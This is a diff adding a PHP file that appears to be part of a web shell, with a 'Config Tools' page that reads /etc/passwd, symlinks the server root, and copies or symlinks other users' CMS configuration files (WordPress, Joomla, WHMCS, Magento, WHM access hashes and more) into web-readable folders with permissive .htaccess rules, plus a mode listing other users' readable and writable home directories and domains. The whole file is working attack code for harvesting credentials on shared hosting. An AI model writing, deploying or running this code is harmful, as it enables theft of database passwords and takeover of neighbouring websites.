@@ -1,0 +1,393 @@
+<?php
+function exe($cmd) {
+    return shell_exec($cmd);
+}
+
+if(isset($_GET['config']) && $_GET['config'] == 'grabber') {
+    if(strtolower(substr(PHP_OS, 0, 3)) == "win"){
+        echo '<script>alert("Tidak bisa di gunakan di server windows")</script>';
+        exit;
+    }
+    
+    if($_POST) {
+        if($_POST['config'] == 'symvhosts') {
+            @mkdir("con7ext_symvhosts", 0777);
+            exe("ln -s / con7ext_symvhosts/root");
+            $htaccess = "Options Indexes FollowSymLinks
+            DirectoryIndex con7ext.htm
+            AddType text/plain .php 
+            AddHandler text/plain .php
+            Satisfy Any";
+            @file_put_contents("con7ext_symvhosts/.htaccess", $htaccess);
+            
+            $etc_passwd = $_POST['passwd'];
+            $etc_passwd = explode("\n", $etc_passwd);
+            
+            foreach($etc_passwd as $passwd) {
+                $pawd = explode(":", $passwd);
+                $user = $pawd[5];
+                $jembod = preg_replace('/\/var\/www\/vhosts\//', '', $user);
+                
+                if (preg_match('/vhosts/i', $user)) {
+                    exe("ln -s ".$user."/httpdocs/wp-config.php con7ext_symvhosts/".$jembod."-Wordpress.txt");
+                    exe("ln -s ".$user."/httpdocs/configuration.php con7ext_symvhosts/".$jembod."-Joomla.txt");
+                    exe("ln -s ".$user."/httpdocs/config/koneksi.php con7ext_symvhosts/".$jembod."-Lokomedia.txt");
+                    exe("ln -s ".$user."/httpdocs/forum/config.php con7ext_symvhosts/".$jembod."-phpBB.txt");
+                    exe("ln -s ".$user."/httpdocs/sites/default/settings.php con7ext_symvhosts/".$jembod."-Drupal.txt");
+                    exe("ln -s ".$user."/httpdocs/config/settings.inc.php con7ext_symvhosts/".$jembod."-PrestaShop.txt");
+                    exe("ln -s ".$user."/httpdocs/app/etc/local.xml con7ext_symvhosts/".$jembod."-Magento.txt");
+                    exe("ln -s ".$user."/httpdocs/admin/config.php con7ext_symvhosts/".$jembod."-OpenCart.txt");
+                    exe("ln -s ".$user."/httpdocs/application/config/database.php con7ext_symvhosts/".$jembod."-Ellislab.txt"); 
+                }
+            }
+        }
+        
+        if($_POST['config'] == 'symlink') {
+            @mkdir("con7ext_symconfig", 0777);
+            @symlink("/", "con7ext_symconfig/root");
+            $htaccess = "Options Indexes FollowSymLinks
+            DirectoryIndex con7ext.htm
+            AddType text/plain .php 
+            AddHandler text/plain .php
+            Satisfy Any";
+            @file_put_contents("con7ext_symconfig/.htaccess", $htaccess);
+        }
+        
+        if($_POST['config'] == '404') {
+            @mkdir("con7ext_sym404", 0777);
+            @symlink("/", "con7ext_sym404/root");
+            $htaccess = "Options Indexes FollowSymLinks
+            DirectoryIndex con7ext.htm
+            AddType text/plain .php 
+            AddHandler text/plain .php
+            Satisfy Any
+            IndexOptions +Charset=UTF-8 +FancyIndexing +IgnoreCase +FoldersFirst +XHTML +HTMLTable +SuppressRules +SuppressDescription +NameWidth=*
+            IndexIgnore *.txt404
+            RewriteEngine On
+            RewriteCond %{REQUEST_FILENAME} ^.*con7ext_sym404 [NC]
+            RewriteRule \.txt$ %{REQUEST_URI}404 [L,R=302.NC]";
+            @file_put_contents("con7ext_sym404/.htaccess", $htaccess);
+        }
+        
+        if($_POST['config'] == 'grab') {
+            mkdir("con7ext_configgrab", 0777);
+            $isi_htc = "Options all\nRequire None\nSatisfy Any";
+            $htc = fopen("con7ext_configgrab/.htaccess", "w");
+            fwrite($htc, $isi_htc);
+        }
+        
+        $passwd = $_POST['passwd'];
+        preg_match_all('/(.*?):x:/', $passwd, $user_config);
+        
+        foreach($user_config[1] as $user_con7ext) {
+            $grab_config = array(
+				"/home/$user_con7ext/.accesshash" => "WHM-accesshash",
+				"/home/$user_con7ext/public_html/config/koneksi.php" => "Lokomedia",
+				"/home/$user_con7ext/public_html/forum/config.php" => "phpBB",
+				"/home/$user_con7ext/public_html/sites/default/settings.php" => "Drupal",
+				"/home/$user_con7ext/public_html/config/settings.inc.php" => "PrestaShop",
+				"/home/$user_con7ext/public_html/app/etc/local.xml" => "Magento",
+				"/home/$user_con7ext/public_html/admin/config.php" => "OpenCart",
+				"/home/$user_con7ext/public_html/application/config/database.php" => "Ellislab",
+				"/home/$user_con7ext/public_html/vb/includes/config.php" => "Vbulletin",
+				"/home/$user_con7ext/public_html/includes/config.php" => "Vbulletin",
+				"/home/$user_con7ext/public_html/forum/includes/config.php" => "Vbulletin",
+				"/home/$user_con7ext/public_html/forums/includes/config.php" => "Vbulletin",
+				"/home/$user_con7ext/public_html/cc/includes/config.php" => "Vbulletin",
+				"/home/$user_con7ext/public_html/inc/config.php" => "MyBB",
+				"/home/$user_con7ext/public_html/includes/configure.php" => "OsCommerce",
+				"/home/$user_con7ext/public_html/shop/includes/configure.php" => "OsCommerce",
+				"/home/$user_con7ext/public_html/os/includes/configure.php" => "OsCommerce",
+				"/home/$user_con7ext/public_html/oscom/includes/configure.php" => "OsCommerce",
+				"/home/$user_con7ext/public_html/products/includes/configure.php" => "OsCommerce",
+				"/home/$user_con7ext/public_html/cart/includes/configure.php" => "OsCommerce",
+				"/home/$user_con7ext/public_html/inc/conf_global.php" => "IPB",
+				"/home/$user_con7ext/public_html/wp-config.php" => "Wordpress",
+				"/home/$user_con7ext/public_html/wp/test/wp-config.php" => "Wordpress",
+				"/home/$user_con7ext/public_html/blog/wp-config.php" => "Wordpress",
+				"/home/$user_con7ext/public_html/beta/wp-config.php" => "Wordpress",
+				"/home/$user_con7ext/public_html/portal/wp-config.php" => "Wordpress",
+				"/home/$user_con7ext/public_html/site/wp-config.php" => "Wordpress",
+				"/home/$user_con7ext/public_html/wp/wp-config.php" => "Wordpress",
+				"/home/$user_con7ext/public_html/WP/wp-config.php" => "Wordpress",
+				"/home/$user_con7ext/public_html/news/wp-config.php" => "Wordpress",
+				"/home/$user_con7ext/public_html/wordpress/wp-config.php" => "Wordpress",
+				"/home/$user_con7ext/public_html/test/wp-config.php" => "Wordpress",
+				"/home/$user_con7ext/public_html/demo/wp-config.php" => "Wordpress",
+				"/home/$user_con7ext/public_html/home/wp-config.php" => "Wordpress",
+				"/home/$user_con7ext/public_html/v1/wp-config.php" => "Wordpress",
+				"/home/$user_con7ext/public_html/v2/wp-config.php" => "Wordpress",
+				"/home/$user_con7ext/public_html/press/wp-config.php" => "Wordpress",
+				"/home/$user_con7ext/public_html/new/wp-config.php" => "Wordpress",
+				"/home/$user_con7ext/public_html/blogs/wp-config.php" => "Wordpress",
+				"/home/$user_con7ext/public_html/configuration.php" => "Joomla",
+				"/home/$user_con7ext/public_html/blog/configuration.php" => "Joomla",
+				"/home/$user_con7ext/public_html/submitticket.php" => "^WHMCS",
+				"/home/$user_con7ext/public_html/cms/configuration.php" => "Joomla",
+				"/home/$user_con7ext/public_html/beta/configuration.php" => "Joomla",
+				"/home/$user_con7ext/public_html/portal/configuration.php" => "Joomla",
+				"/home/$user_con7ext/public_html/site/configuration.php" => "Joomla",
+				"/home/$user_con7ext/public_html/main/configuration.php" => "Joomla",
+				"/home/$user_con7ext/public_html/home/configuration.php" => "Joomla",
+				"/home/$user_con7ext/public_html/demo/configuration.php" => "Joomla",
+				"/home/$user_con7ext/public_html/test/configuration.php" => "Joomla",
+				"/home/$user_con7ext/public_html/v1/configuration.php" => "Joomla",
+				"/home/$user_con7ext/public_html/v2/configuration.php" => "Joomla",
+				"/home/$user_con7ext/public_html/joomla/configuration.php" => "Joomla",
+				"/home/$user_con7ext/public_html/new/configuration.php" => "Joomla",
+				"/home/$user_con7ext/public_html/WHMCS/submitticket.php" => "WHMCS",
+				"/home/$user_con7ext/public_html/whmcs1/submitticket.php" => "WHMCS",
+				"/home/$user_con7ext/public_html/Whmcs/submitticket.php" => "WHMCS",
+				"/home/$user_con7ext/public_html/whmcs/submitticket.php" => "WHMCS",
+				"/home/$user_con7ext/public_html/whmcs/submitticket.php" => "WHMCS",
+				"/home/$user_con7ext/public_html/WHMC/submitticket.php" => "WHMCS",
+				"/home/$user_con7ext/public_html/Whmc/submitticket.php" => "WHMCS",
+				"/home/$user_con7ext/public_html/whmc/submitticket.php" => "WHMCS",
+				"/home/$user_con7ext/public_html/WHM/submitticket.php" => "WHMCS",
+				"/home/$user_con7ext/public_html/Whm/submitticket.php" => "WHMCS",
+				"/home/$user_con7ext/public_html/whm/submitticket.php" => "WHMCS",
+				"/home/$user_con7ext/public_html/HOST/submitticket.php" => "WHMCS",
+				"/home/$user_con7ext/public_html/Host/submitticket.php" => "WHMCS",
+				"/home/$user_con7ext/public_html/host/submitticket.php" => "WHMCS",
+				"/home/$user_con7ext/public_html/SUPPORTES/submitticket.php" => "WHMCS",
+				"/home/$user_con7ext/public_html/Supportes/submitticket.php" => "WHMCS",
+				"/home/$user_con7ext/public_html/supportes/submitticket.php" => "WHMCS",
+				"/home/$user_con7ext/public_html/domains/submitticket.php" => "WHMCS",
+				"/home/$user_con7ext/public_html/domain/submitticket.php" => "WHMCS",
+				"/home/$user_con7ext/public_html/Hosting/submitticket.php" => "WHMCS",
+				"/home/$user_con7ext/public_html/HOSTING/submitticket.php" => "WHMCS",
+				"/home/$user_con7ext/public_html/hosting/submitticket.php" => "WHMCS",
+				"/home/$user_con7ext/public_html/CART/submitticket.php" => "WHMCS",
+				"/home/$user_con7ext/public_html/Cart/submitticket.php" => "WHMCS",
+				"/home/$user_con7ext/public_html/cart/submitticket.php" => "WHMCS",
+				"/home/$user_con7ext/public_html/ORDER/submitticket.php" => "WHMCS",
+				"/home/$user_con7ext/public_html/Order/submitticket.php" => "WHMCS",
+				"/home/$user_con7ext/public_html/order/submitticket.php" => "WHMCS",
+				"/home/$user_con7ext/public_html/CLIENT/submitticket.php" => "WHMCS",
+				"/home/$user_con7ext/public_html/Client/submitticket.php" => "WHMCS",
+				"/home/$user_con7ext/public_html/client/submitticket.php" => "WHMCS",
+				"/home/$user_con7ext/public_html/CLIENTAREA/submitticket.php" => "WHMCS",
+				"/home/$user_con7ext/public_html/Clientarea/submitticket.php" => "WHMCS",
+				"/home/$user_con7ext/public_html/clientarea/submitticket.php" => "WHMCS",
+				"/home/$user_con7ext/public_html/SUPPORT/submitticket.php" => "WHMCS",
+				"/home/$user_con7ext/public_html/Support/submitticket.php" => "WHMCS",
+				"/home/$user_con7ext/public_html/support/submitticket.php" => "WHMCS",
+				"/home/$user_con7ext/public_html/BILLING/submitticket.php" => "WHMCS",
+				"/home/$user_con7ext/public_html/Billing/submitticket.php" => "WHMCS",
+				"/home/$user_con7ext/public_html/billing/submitticket.php" => "WHMCS",
+				"/home/$user_con7ext/public_html/BUY/submitticket.php" => "WHMCS",
+				"/home/$user_con7ext/public_html/Buy/submitticket.php" => "WHMCS",
+				"/home/$user_con7ext/public_html/buy/submitticket.php" => "WHMCS",
+				"/home/$user_con7ext/public_html/MANAGE/submitticket.php" => "WHMCS",
+				"/home/$user_con7ext/public_html/Manage/submitticket.php" => "WHMCS",
+				"/home/$user_con7ext/public_html/manage/submitticket.php" => "WHMCS",
+				"/home/$user_con7ext/public_html/CLIENTSUPPORT/submitticket.php" => "WHMCS",
+				"/home/$user_con7ext/public_html/ClientSupport/submitticket.php" => "WHMCS",
+				"/home/$user_con7ext/public_html/Clientsupport/submitticket.php" => "WHMCS",
+				"/home/$user_con7ext/public_html/clientsupport/submitticket.php" => "WHMCS",
+				"/home/$user_con7ext/public_html/CHECKOUT/submitticket.php" => "WHMCS",
+				"/home/$user_con7ext/public_html/Checkout/submitticket.php" => "WHMCS",
+				"/home/$user_con7ext/public_html/checkout/submitticket.php" => "WHMCS",
+				"/home/$user_con7ext/public_html/BILLINGS/submitticket.php" => "WHMCS",
+				"/home/$user_con7ext/public_html/Billings/submitticket.php" => "WHMCS",
+				"/home/$user_con7ext/public_html/billings/submitticket.php" => "WHMCS",
+				"/home/$user_con7ext/public_html/BASKET/submitticket.php" => "WHMCS",
+				"/home/$user_con7ext/public_html/Basket/submitticket.php" => "WHMCS",
+				"/home/$user_con7ext/public_html/basket/submitticket.php" => "WHMCS",
+				"/home/$user_con7ext/public_html/SECURE/submitticket.php" => "WHMCS",
+				"/home/$user_con7ext/public_html/Secure/submitticket.php" => "WHMCS",
+				"/home/$user_con7ext/public_html/secure/submitticket.php" => "WHMCS",
+				"/home/$user_con7ext/public_html/SALES/submitticket.php" => "WHMCS",
+				"/home/$user_con7ext/public_html/Sales/submitticket.php" => "WHMCS",
+				"/home/$user_con7ext/public_html/sales/submitticket.php" => "WHMCS",
+				"/home/$user_con7ext/public_html/BILL/submitticket.php" => "WHMCS",
+				"/home/$user_con7ext/public_html/Bill/submitticket.php" => "WHMCS",
+				"/home/$user_con7ext/public_html/bill/submitticket.php" => "WHMCS",
+				"/home/$user_con7ext/public_html/PURCHASE/submitticket.php" => "WHMCS",
+				"/home/$user_con7ext/public_html/Purchase/submitticket.php" => "WHMCS",
+				"/home/$user_con7ext/public_html/purchase/submitticket.php" => "WHMCS",
+				"/home/$user_con7ext/public_html/ACCOUNT/submitticket.php" => "WHMCS",
+				"/home/$user_con7ext/public_html/Account/submitticket.php" => "WHMCS",
+				"/home/$user_con7ext/public_html/account/submitticket.php" => "WHMCS",
+				"/home/$user_con7ext/public_html/USER/submitticket.php" => "WHMCS",
+				"/home/$user_con7ext/public_html/User/submitticket.php" => "WHMCS",
+				"/home/$user_con7ext/public_html/user/submitticket.php" => "WHMCS",
+				"/home/$user_con7ext/public_html/CLIENTS/submitticket.php" => "WHMCS",
+				"/home/$user_con7ext/public_html/Clients/submitticket.php" => "WHMCS",
+				"/home/$user_con7ext/public_html/clients/submitticket.php" => "WHMCS",
+				"/home/$user_con7ext/public_html/BILLINGS/submitticket.php" => "WHMCS",
+				"/home/$user_con7ext/public_html/Billings/submitticket.php" => "WHMCS",
+				"/home/$user_con7ext/public_html/billings/submitticket.php" => "WHMCS",
+				"/home/$user_con7ext/public_html/MY/submitticket.php" => "WHMCS",
+				"/home/$user_con7ext/public_html/My/submitticket.php" => "WHMCS",
+				"/home/$user_con7ext/public_html/my/submitticket.php" => "WHMCS",
+				"/home/$user_con7ext/public_html/secure/whm/submitticket.php" => "WHMCS",
+				"/home/$user_con7ext/public_html/secure/whmcs/submitticket.php" => "WHMCS",
+				"/home/$user_con7ext/public_html/panel/submitticket.php" => "WHMCS",
+				"/home/$user_con7ext/public_html/clientes/submitticket.php" => "WHMCS",
+				"/home/$user_con7ext/public_html/cliente/submitticket.php" => "WHMCS",
+				"/home/$user_con7ext/public_html/support/order/submitticket.php" => "WHMCS",
+				"/home/$user_con7ext/public_html/bb-config.php" => "BoxBilling",
+				"/home/$user_con7ext/public_html/boxbilling/bb-config.php" => "BoxBilling",
+				"/home/$user_con7ext/public_html/box/bb-config.php" => "BoxBilling",
+				"/home/$user_con7ext/public_html/host/bb-config.php" => "BoxBilling",
+				"/home/$user_con7ext/public_html/Host/bb-config.php" => "BoxBilling",
+				"/home/$user_con7ext/public_html/supportes/bb-config.php" => "BoxBilling",
+				"/home/$user_con7ext/public_html/support/bb-config.php" => "BoxBilling",
+				"/home/$user_con7ext/public_html/hosting/bb-config.php" => "BoxBilling",
+				"/home/$user_con7ext/public_html/cart/bb-config.php" => "BoxBilling",
+				"/home/$user_con7ext/public_html/order/bb-config.php" => "BoxBilling",
+				"/home/$user_con7ext/public_html/client/bb-config.php" => "BoxBilling",
+				"/home/$user_con7ext/public_html/clients/bb-config.php" => "BoxBilling",
+				"/home/$user_con7ext/public_html/cliente/bb-config.php" => "BoxBilling",
+				"/home/$user_con7ext/public_html/clientes/bb-config.php" => "BoxBilling",
+				"/home/$user_con7ext/public_html/billing/bb-config.php" => "BoxBilling",
+				"/home/$user_con7ext/public_html/billings/bb-config.php" => "BoxBilling",
+				"/home/$user_con7ext/public_html/my/bb-config.php" => "BoxBilling",
+				"/home/$user_con7ext/public_html/secure/bb-config.php" => "BoxBilling",
+				"/home/$user_con7ext/public_html/support/order/bb-config.php" => "BoxBilling",
+				"/home/$user_con7ext/public_html/includes/dist-configure.php" => "Zencart",
+				"/home/$user_con7ext/public_html/zencart/includes/dist-configure.php" => "Zencart",
+				"/home/$user_con7ext/public_html/products/includes/dist-configure.php" => "Zencart",
+				"/home/$user_con7ext/public_html/cart/includes/dist-configure.php" => "Zencart",
+				"/home/$user_con7ext/public_html/shop/includes/dist-configure.php" => "Zencart",
+				"/home/$user_con7ext/public_html/includes/iso4217.php" => "Hostbills",
+				"/home/$user_con7ext/public_html/hostbills/includes/iso4217.php" => "Hostbills",
+				"/home/$user_con7ext/public_html/host/includes/iso4217.php" => "Hostbills",
+				"/home/$user_con7ext/public_html/Host/includes/iso4217.php" => "Hostbills",
+				"/home/$user_con7ext/public_html/supportes/includes/iso4217.php" => "Hostbills",
+				"/home/$user_con7ext/public_html/support/includes/iso4217.php" => "Hostbills",
+				"/home/$user_con7ext/public_html/hosting/includes/iso4217.php" => "Hostbills",
+				"/home/$user_con7ext/public_html/cart/includes/iso4217.php" => "Hostbills",
+				"/home/$user_con7ext/public_html/order/includes/iso4217.php" => "Hostbills",
+				"/home/$user_con7ext/public_html/client/includes/iso4217.php" => "Hostbills",
+				"/home/$user_con7ext/public_html/clients/includes/iso4217.php" => "Hostbills",
+				"/home/$user_con7ext/public_html/cliente/includes/iso4217.php" => "Hostbills",
+				"/home/$user_con7ext/public_html/clientes/includes/iso4217.php" => "Hostbills",
+				"/home/$user_con7ext/public_html/billing/includes/iso4217.php" => "Hostbills",
+				"/home/$user_con7ext/public_html/billings/includes/iso4217.php" => "Hostbills",
+				"/home/$user_con7ext/public_html/my/includes/iso4217.php" => "Hostbills",
+				"/home/$user_con7ext/public_html/secure/includes/iso4217.php" => "Hostbills",
+				"/home/$user_con7ext/public_html/support/order/includes/iso4217.php" => "Hostbills"
+            );
+            
+            foreach($grab_config as $config => $nama_config) {
+                if($_POST['config'] == 'grab') {
+                    $ambil_config = file_get_contents($config);
+                    if($ambil_config != '') {
+                        $file_config = fopen("con7ext_configgrab/$user_con7ext-$nama_config.txt", "w");
+                        fputs($file_config, $ambil_config);
+                    }
+                }
+                
+                if($_POST['config'] == 'symlink') {
+                    @symlink($config, "con7ext_Symconfig/".$user_con7ext."-".$nama_config.".txt");
+                }
+                
+                if($_POST['config'] == '404') {
+                    $sym404 = symlink($config, "con7ext_sym404/".$user_con7ext."-".$nama_config.".txt");
+                    if($sym404) {
+                        @mkdir("con7ext_sym404/".$user_con7ext."-".$nama_config.".txt404", 0777);
+                        $htaccess = "Options Indexes FollowSymLinks
+                        DirectoryIndex con7ext.htm
+                        HeaderName con7ext.txt
+                        Satisfy Any
+                        IndexOptions IgnoreCase FancyIndexing FoldersFirst NameWidth=* DescriptionWidth=* SuppressHTMLPreamble
+                        IndexIgnore *";
+                        @file_put_contents("con7ext_sym404/".$user_con7ext."-".$nama_config.".txt404/.htaccess", $htaccess);
+                        @symlink($config, "con7ext_sym404/".$user_con7ext."-".$nama_config.".txt404/con7ext.txt");
+                    }
+                }
+            }
+        }
+        
+        if($_POST['config'] == 'grab') {
+            echo "<center><a href='?path=$path/con7ext_configgrab'><font color=lime>Done</font></a></center>";
+        }
+        
+        if($_POST['config'] == '404') {
+            echo "<center>
+            <a href=\"con7ext_sym404/root/\">SymlinkNya</a>
+            <br><a href=\"con7ext_sym404/\">Configurations</a></center>";
+        }
+        
+        if($_POST['config'] == 'symlink') {
+            echo "<center>
+            <a href=\"con7ext_symconfig/root/\">Symlinknya</a>
+            <br><a href=\"con7ext_symconfig/\">Configurations</a></center>";
+        }
+        
+        if($_POST['config'] == 'symvhost') {
+            echo "<center>
+            <a href=\"con7ext_symvhost/root/\">Root Server</a>
+            <br><a href=\"con7ext_symvhost/\">Configurations</a></center>";
+        }
+    } else {
+        echo "<form method=\"post\" action=\"\"><center>
+        <textarea name=\"passwd\" class='area' rows='15' cols='60'>\n";
+        echo file_get_contents("/etc/passwd");
+        echo "</textarea><br><br>
+        <select class=\"select\" name=\"config\" style=\"width: 450px;\">
+            <option value=\"grab\">Config Grab</option>
+            <option value=\"symlink\">Symlink Config</option>
+            <option value=\"404\">Config 404</option>
+            <option value=\"symvhosts\">Vhosts Config Grabber</option>
+        </select><br><br>
+        <input type=\"submit\" value=\"Start!!\"></center></form>\n";
+    }
+} elseif(isset($_GET['jancok']) && $_GET['jancok'] == 'jumping') {
+    $i = 0;
+    echo "<pre><div style='margin: 5px auto;'>";
+    $etc = fopen("/etc/passwd", "r") or die("<font color=red>Can't read /etc/passwd</font>");
+    
+    while($passwd = fgets($etc)) {
+        if($passwd == '' || !$etc) {
+            echo "<font color=red>Can't read /etc/passwd</font>";
+        } else {
+            preg_match_all('/(.*?):x:/', $passwd, $user_jumping);
+            
+            foreach($user_jumping[1] as $user_con7ext_jump) {
+                $user_jumping_dir = "/home/$user_con7ext_jump/public_html";if(is_readable($user_jumping_dir)) {
+                    $i++;
+                    $jrw = "[<font color=white>R</font>] <a href='?path=$user_jumping_dir'><font color=gold>$user_jumping_dir</font></a>";
+                    
+                    if(is_writable($user_jumping_dir)) {
+                        $jrw = "[<font color=white>RW</font>] <a href='?path=$user_jumping_dir'><font color=gold>$user_jumping_dir</font></a>";
+                    }
+                    echo $jrw;
+                    
+                    if(function_exists('posix_getpwuid')) {
+                        $domain_jump = file_get_contents("/etc/named.conf");
+                        
+                        if($domain_jump == '') {
+                            echo " => ( <font color=red>gabisa ambil nama domain nya</font> )<br>";
+                        } else {
+                            preg_match_all("#/var/named/(.*?).db#", $domain_jump, $domains_jump);
+                            
+                            foreach($domains_jump[1] as $dj) {
+                                $user_jumping_url = posix_getpwuid(@fileowner("/etc/valiases/$dj"));
+                                $user_jumping_url = $user_jumping_url['name'];
+                                
+                                if($user_jumping_url == $user_con7ext_jump) {
+                                    echo " => ( <u>$dj</u> )<br>";
+                                    break;
+                                }
+                            }
+                        }
+                    } else {
+                        echo "<br>";
+                    }
+                }
+            }
+        }
+    }
+    
+    if($i == 0) {
+    } else {
+        echo "<br>Total ada ".$i." Kamar di ".gethostbyname($_SERVER['HTTP_HOST'])."";
+    }
+    echo "</div></pre>";
+} else {
+    echo "<a href='?config=grabber'>Config Tools</a>";
+}
+?>
